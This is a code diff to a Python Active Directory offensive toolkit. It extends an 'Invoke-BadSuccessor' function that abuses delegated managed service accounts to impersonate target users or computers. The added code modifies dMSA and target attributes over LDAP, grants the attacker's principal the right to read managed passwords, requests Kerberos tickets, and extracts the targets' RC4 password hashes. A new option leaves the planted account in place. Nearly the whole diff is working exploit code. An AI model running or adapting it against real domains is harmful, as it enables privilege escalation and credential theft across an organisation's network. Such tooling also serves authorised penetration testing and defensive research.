@@ -4684,10 +4684,22 @@ displayName=New Group Policy Object
 			raw=raw
 		)
 		for entry in entries:
-			if entry.get("attributes",{}).get("msDS-GroupMSAMembership"):
-				entry["attributes"]["msDS-GroupMSAMembership"] = self.convertfrom_sid(entry["attributes"]["msDS-GroupMSAMembership"])
-			if entry.get("attributes",{}).get("msDS-AllowedToActOnBehalfOfOtherIdentity"):
-				entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = self.convertfrom_sid(entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"])
+			msa_group = entry.get("attributes", {}).get("msDS-GroupMSAMembership")
+			if msa_group:
+				if isinstance(msa_group, list):
+					entry["attributes"]["msDS-GroupMSAMembership"] = [
+						self.convertfrom_sid(item) for item in msa_group
+					]
+				else:
+					entry["attributes"]["msDS-GroupMSAMembership"] = self.convertfrom_sid(msa_group)
+			allowed_on_behalf = entry.get("attributes", {}).get("msDS-AllowedToActOnBehalfOfOtherIdentity")
+			if allowed_on_behalf:
+				if isinstance(allowed_on_behalf, list):
+					entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = [
+						self.convertfrom_sid(item) for item in allowed_on_behalf
+					]
+				else:
+					entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = self.convertfrom_sid(allowed_on_behalf)
 		logging.debug(f"[Get-DomainDMSA] Found {len(entries)} object(s) with dmsa attribute")
 		return entries
 
@@ -6543,7 +6555,7 @@ displayName=New Group Policy Object
 			logging.error(f"[Invoke-MessageBox] Failed to send message to session {session_id} on {identity}")
 		return success
 
-	def invoke_badsuccessor(self, identity=None, dmsaname=None, principalallowed=None, targetidentity=None, basedn=None, force=False, nocache=False, args=None):
+	def invoke_badsuccessor(self, identity=None, dmsaname=None, principalallowed=None, targetidentity=None, basedn=None, force=False, no_delete=False, nocache=False, args=None):
 		if args:
 			if dmsaname is None and hasattr(args, 'dmsaname') and args.dmsaname:
 				dmsaname = args.dmsaname
@@ -6555,6 +6567,8 @@ displayName=New Group Policy Object
 				basedn = args.basedn
 			if force is None and hasattr(args, 'force'):
 				force = args.force
+			if hasattr(args, 'no_delete'):
+				no_delete = args.no_delete
 			if hasattr(args, 'nocache'):
 				nocache = args.nocache
 		
@@ -6562,15 +6576,45 @@ displayName=New Group Policy Object
 			dmsaname = get_random_name(service_account=True)
 		if not principalallowed:
 			principalallowed = self.conn.username
-		if not targetidentity:
-			logging.warning("[Invoke-BadSuccessor] No target identity provided. Using Administrator as default")
-			targetidentity = "Administrator"
 
 		# add mirrored value to the target identity
 		# msDS_SupersededManagedServiceAccountLink = DMSA_DN
 		# msDS-SupersededAccountState = 2
 
-		if not basedn:
+		# add dmsa account if not exists
+		using_existing_dmsa = False
+		dmsa_entries = self.get_domaindmsa(identity=dmsaname, properties=['sAMAccountName', 'distinguishedName', 'msDS-GroupMSAMembership'], raw=True)
+		dmsa_dn = None
+		if len(dmsa_entries) == 1:
+			dmsaname = dmsa_entries[0].get("attributes", {}).get("sAMAccountName")
+			dmsa_dn = dmsa_entries[0].get("attributes", {}).get("distinguishedName")
+			group_membership_sd = dmsa_entries[0].get("attributes", {}).get("msDS-GroupMSAMembership")
+			group_membership_sids = MSA.read_acl(group_membership_sd)
+			principalallowed_entries = self.get_domainobject(identity=principalallowed, properties=['objectSid'])
+			if len(principalallowed_entries) == 0:
+				logging.error(f"[Invoke-BadSuccessor] Principal {principalallowed} not found")
+				return False
+			elif len(principalallowed_entries) > 1:
+				logging.error(f"[Invoke-BadSuccessor] More than one principal {principalallowed} found. Use DN instead.")
+				return False
+			principalallowed_sid = principalallowed_entries[0].get("attributes", {}).get("objectSid")
+			if not principalallowed_sid:
+				logging.error(f"[Invoke-BadSuccessor] Principal {principalallowed} has no objectSid")
+				return False
+			if not group_membership_sids or principalallowed_sid not in group_membership_sids:
+				logging.warning(f"[Invoke-BadSuccessor] DMSA account {dmsaname} does not allow {principalallowed} to retrieve managed password. Adding...")
+				msa_membership = MSA.add_msamembership(group_membership_sd, principalallowed_sid)
+				succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [msa_membership])]})
+				if not succeeded:
+					logging.error(f"[Invoke-BadSuccessor] Failed to add {principalallowed} to DMSA account {dmsaname}")
+					return False
+			logging.warning(f"[Invoke-BadSuccessor] Using existing DMSA account {dmsaname}")
+			using_existing_dmsa = True
+		elif len(dmsa_entries) > 1:
+			logging.error(f"[Invoke-BadSuccessor] More than one DMSA account {dmsaname} found. Use DN instead")
+			return
+
+		if not basedn and not using_existing_dmsa:
 			logging.warning(f"[Invoke-BadSuccessor] No basedn provided. Searching for writable OU in {self.root_dn}...")
 			writable_ous = self.get_domainou(
 				properties = ['distinguishedName'],
@@ -6582,7 +6626,7 @@ displayName=New Group Policy Object
 				basedn = self.root_dn
 			elif len(writable_ous) > 1:
 				c_key = 0
-				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
+				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is writable')
 				cnt = 0
 				for ou in writable_ous:
 					print(f"{cnt}: {ou['attributes']['distinguishedName']}")
@@ -6607,28 +6651,33 @@ displayName=New Group Policy Object
 					return
 				basedn = writable_ous[0]['attributes']['distinguishedName']
 
-		#add dmsa account
-		try:
-			succeed = self.add_domaindmsa(identity=dmsaname, supersededaccount=targetidentity, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
-			if not succeed:
-				logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
+		if not using_existing_dmsa:
+			try:
+				succeed = self.add_domaindmsa(identity=dmsaname, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
+				if not succeed:
+					logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
+					return
+				dmsa_dn = f"CN={dmsaname},{basedn}"
+			except Exception as e:
+				if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
+					logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
+				else:
+					if self.args.stack_trace:
+						raise e
+					logging.error(f"[Invoke-BadSuccessor] {str(e)}")
 				return
-		except Exception as e:
-			if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
-				logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
-			else:
-				if self.args.stack_trace:
-					raise e
-				logging.error(f"[Invoke-BadSuccessor] {str(e)}")
+		else:
+			# verify if dmsa account fultill the requirements
+			pass
+		
+		# modify dmsa account
+		target_users = self.get_domainuser(identity=targetidentity, properties=['objectClass', 'distinguishedName', 'sAMAccountName', 'objectClass'])
+		target_computers = self.get_domaincomputer(identity=targetidentity, properties=['objectClass', 'distinguishedName', 'sAMAccountName', 'objectClass'])
+		targets = target_users + target_computers
+		if len(targets) == 0:
+			logging.error(f"[Invoke-BadSuccessor] No targets account found")
 			return
-
-		entries = []
-		# request service ticket for dmsaname
-		from impacket.krb5.types import Principal
-		from impacket.krb5 import constants
-		from impacket.krb5.kerberosv5 import getKerberosTGT
-		from binascii import unhexlify
-
+		
 		tgt = self.conn.get_TGT()
 		if not tgt:
 			userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -6636,26 +6685,44 @@ displayName=New Group Policy Object
 																unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
 																self.conn.kdcHost)
 
-		tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$')
-		if tgs:
-			sessionKey = oldSessionKey
+		entries = []
+		for target in targets:
+			target_dn = target.get('attributes', {}).get('distinguishedName')
+			target_san = target.get('attributes', {}).get('sAMAccountName')
+			target_objectclass = target.get('attributes', {}).get('objectClass')
+			if 'msDS-DelegatedManagedServiceAccount' in target_objectclass:
+				continue
+			succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])], 'msDS-DelegatedMSAState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.MIGRATED.value])]})
+			if not succeeded:
+				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-ManagedAccountPrecededByLink to {target_san or target_dn}")
+			
+			succeeded = self.ldap_session.modify(target_dn, {'msDS-SupersededManagedAccountLink': [(ldap3.MODIFY_REPLACE, [dmsa_dn])], 'msDS-SupersededServiceAccountState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.MIGRATED.value])]})
+			if not succeeded:
+				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-SupersededManagedAccountLink to {dmsa_dn}")
+			
+			logging.debug(f"[Invoke-BadSuccessor] Successfully modified dmsa and target account attributes")
+			
+			tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.doDMSA(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.conn.nthash), self.conn.auth_aes_key, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$' if not dmsaname.endswith('$') else dmsaname)
+			if tgs:
+				sessionKey = oldSessionKey
 
-			for key in previous_keys:
-				try:
-					entries.append(
-						{
-							"attributes": {
-								"Domain": self.conn.get_domain(),
-								"Identity": targetidentity,
-								"RC4": key[constants.EncryptionTypes.rc4_hmac]
+				for key in previous_keys:
+					try:
+						logging.debug("[Invoke-BadSuccessor: Output] {0}\\{1}:{2}".format(self.conn.get_domain(), target_san or target_dn, key[constants.EncryptionTypes.rc4_hmac]))
+						entries.append(
+							{
+								"attributes": {
+									"Domain": self.conn.get_domain(),
+									"Identity": target_san or target_dn,
+									"RC4": key[constants.EncryptionTypes.rc4_hmac]
+								}
 							}
-						}
-					)
-					break
-				except:
-					pass
-		else:
-			logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")
+						)
+						break
+					except:
+						pass
+			else:
+				logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")
 
 		# dmsa_dn = self.get_domaindmsa(identity=dmsaname, properties=['distinguishedName'], searchbase=basedn)[0].get('attributes', {}).get('distinguishedName', None)
 		# if not dmsa_dn:
@@ -6664,10 +6731,11 @@ displayName=New Group Policy Object
 		# self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, ["CN=DC01,OU=Domain Controllers,DC=range,DC=local"])]})
 
 		# cleanup, remove dmsa account
-		success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
-		if not success:
-			logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
-			return
+		if not using_existing_dmsa and not no_delete:
+			success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
+			if not success:
+				logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
+				return
 		return entries
 
 	def get_netterminalsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
